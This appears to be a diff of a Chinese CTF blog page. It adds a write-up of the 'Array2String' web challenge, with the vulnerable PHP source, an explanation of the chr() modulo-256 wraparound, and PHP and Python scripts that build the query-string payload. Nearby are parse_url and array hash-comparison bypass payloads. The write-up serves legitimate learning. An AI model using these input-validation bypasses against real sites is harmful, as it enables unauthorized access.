@@ -267,7 +267,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">975</span> / Reading time: <span class="post-count">5 min</span></span>
+                        <span>Word count: <span class="post-count">1,254</span> / Reading time: <span class="post-count">6 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -432,8 +432,15 @@ height:50vh;
 <p>此时想到parse_url一个解析漏洞，参考一叶飘零师傅的<a href="http://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">文章</a></p>
 <p>在？前添加 / 会使pares_url函数返回false，这样可以绕过前面的判断会让parse_url返回false</p>
 <p>payload:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://urlfiltering.solveme.peng.kr//?do_you_want_flag=yes</span><br></pre></td></tr></table></figure></p>
-<h2 id="web6-Hash-collison"><a href="#web6-Hash-collison" class="headerlink" title="web6:Hash collison"></a>web6:Hash collison</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'foo'</span>], $_GET[<span class="string">'bar'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(strlen($_GET[<span class="string">'foo'</span>]) &gt; <span class="number">30</span> || strlen($_GET[<span class="string">'bar'</span>]) &gt; <span class="number">30</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Too long'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($_GET[<span class="string">'foo'</span>] === $_GET[<span class="string">'bar'</span>])&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Same value'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hash(<span class="string">'sha512'</span>, $_GET[<span class="string">'foo'</span>]) !== hash(<span class="string">'sha512'</span>, $_GET[<span class="string">'bar'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Different hash'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> $flag, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">``` </span><br><span class="line">可以看到要求我们用不同的值，并且sha512相等，所以立刻想到数组绕过漏洞</span><br><span class="line"></span><br><span class="line">payload:</span><br></pre></td></tr></table></figure>
-<p><a href="http://hashcollision.solveme.peng.kr/?foo[]=1&amp;bar[]=2" target="_blank" rel="noopener">http://hashcollision.solveme.peng.kr/?foo[]=1&amp;bar[]=2</a><br><code>`</code></p>
+<h2 id="web6-Hash-collison"><a href="#web6-Hash-collison" class="headerlink" title="web6:Hash collison"></a>web6:Hash collison</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'foo'</span>], $_GET[<span class="string">'bar'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(strlen($_GET[<span class="string">'foo'</span>]) &gt; <span class="number">30</span> || strlen($_GET[<span class="string">'bar'</span>]) &gt; <span class="number">30</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Too long'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($_GET[<span class="string">'foo'</span>] === $_GET[<span class="string">'bar'</span>])&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Same value'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hash(<span class="string">'sha512'</span>, $_GET[<span class="string">'foo'</span>]) !== hash(<span class="string">'sha512'</span>, $_GET[<span class="string">'bar'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Different hash'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> $flag, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">``` </span><br><span class="line">可以看到要求我们用不同的值，并且sha512相等，所以想到数组绕过漏洞</span><br><span class="line"></span><br><span class="line">payload:</span><br></pre></td></tr></table></figure>
+<p><a href="http://hashcollision.solveme.peng.kr/?foo[]=1&amp;bar[]=2" target="_blank" rel="noopener">http://hashcollision.solveme.peng.kr/?foo[]=1&amp;bar[]=2</a><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## web7:Array2String</span><br><span class="line">```php</span><br><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">    $value = $_GET[&apos;value&apos;];</span><br><span class="line"></span><br><span class="line">    $username = $_GET[&apos;username&apos;];</span><br><span class="line">    $password = $_GET[&apos;password&apos;];</span><br><span class="line"></span><br><span class="line">    for ($i = 0; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">        if ($_GET[&apos;username&apos;]) unset($username);</span><br><span class="line">        if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value);</span><br><span class="line">        else $username .= chr($value[$i]);</span><br><span class="line"></span><br><span class="line">        if ($username == &apos;15th_HackingCamp&apos; &amp;&amp; md5($password) == md5(file_get_contents(&apos;./secret.passwd&apos;))) &#123;</span><br><span class="line">            echo &apos;Hello &apos;.$username.&apos;!&apos;, &apos;&lt;br&gt;&apos;, PHP_EOL;</span><br><span class="line">            echo $flag, &apos;&lt;hr&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure></p>
+<p>由代码可知传入username和password两个变量，password可以通过访问./secret.passwd得到</p>
+<p> username==15th_HackingCamp 但是前面增加限制，在32-127之间，并且经过chr()函数的转义，经查阅chr函数有一个特性：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Note that if the number is higher than 256, it will return the number mod 256.</span><br><span class="line">For example :</span><br><span class="line">chr(321)=A because A=65(256)</span><br></pre></td></tr></table></figure>
+<p><a href="http://www.php.net/manual/zh/function.chr.php" target="_blank" rel="noopener">查阅文章</a><br>得知chr()会自动进行mod256,因此可写脚本：</p>
+<p>php脚本:<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$username = <span class="string">'15th_HackingCamp'</span>;</span><br><span class="line">	$arr = str_split($username);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">foreach</span>($arr <span class="keyword">as</span> $value)&#123;</span><br><span class="line">		$value = ord($value) + <span class="number">256</span>;</span><br><span class="line">		$payload .= <span class="string">'value[]='</span> . $value . <span class="string">'&amp;'</span>;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">echo</span> $payload .= <span class="string">'password=simple_passw0rd'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>生成最后的payload<br>    value[]=305&amp;value[]=309&amp;value[]=372&amp;value[]=360&amp;value[]=351&amp;value[]=328&amp;value[]=353&amp;value[]=355&amp;value[]=363&amp;value[]=361&amp;value[]=366&amp;value[]=359&amp;value[]=323&amp;value[]=353&amp;value[]=365&amp;value[]=368&amp;password=simple_passw0rd</p>
+<p>python脚本：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ook</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://array2string.solveme.peng.kr/'</span></span><br><span class="line">    username_plaintext = <span class="string">'15th_HackingCamp'</span></span><br><span class="line">    mod_number = <span class="number">256</span></span><br><span class="line">    query_str = <span class="string">'?'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> username_plaintext:</span><br><span class="line">        c = ord(i) + mod_number</span><br><span class="line">        query_str += <span class="string">'value[]=%d&amp;'</span> % c</span><br><span class="line">    query_str += <span class="string">'password=simple_passw0rd'</span></span><br><span class="line">    <span class="keyword">print</span> requests.get(url + query_str).content</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    ook()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'ok'</span></span><br></pre></td></tr></table></figure></p>
 
     </article>
     <!-- license  -->
@@ -946,9 +953,16 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 26
+        Total : 27
         </div>
         <!-- search  -->
         
@@ -959,22 +973,13 @@ top:50vh;
     
     
     
-    <div class="archive-year"> Invalid date </div>
+    <div class="archive-year"> 2018 </div>
     <ul class="year-list">
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/07/24/onethinkcms/" >OneThink/Thinkphp 的缓存getshell漏洞</a>
+            <span class="archive-post-date">08/08</span><a class="archive-post-title" href= "/2018/08/08/SJU-game/" >SJU集训结业&淘汰赛 Write Up</a>
         </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> 2018 </div>
-    <ul class="year-list">
     
     
         <li class="archive-post-item">
@@ -1087,6 +1092,29 @@ top:50vh;
         </li>
     
     
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/07/24/onethinkcms/" >OneThink/Thinkphp 的缓存getshell漏洞</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
         <li class="archive-post-item">
             <span class="archive-post-date">05/28</span><a class="archive-post-title" href= "/2018/05/28/python/" >学习python中遇到的问题及总结</a>
         </li>
@@ -1108,11 +1136,11 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="CTF、漏洞"><span class="iconfont-archer">&#xe606;</span>CTF、漏洞</span>
     
-        <span class="sidebar-tag-name" data-tags="learn"><span class="iconfont-archer">&#xe606;</span>learn</span>
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
     
         <span class="sidebar-tag-name" data-tags="漏洞"><span class="iconfont-archer">&#xe606;</span>漏洞</span>
     
-        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+        <span class="sidebar-tag-name" data-tags="learn"><span class="iconfont-archer">&#xe606;</span>learn</span>
     
         <span class="sidebar-tag-name" data-tags="Record,Problem"><span class="iconfont-archer">&#xe606;</span>Record,Problem</span>
     
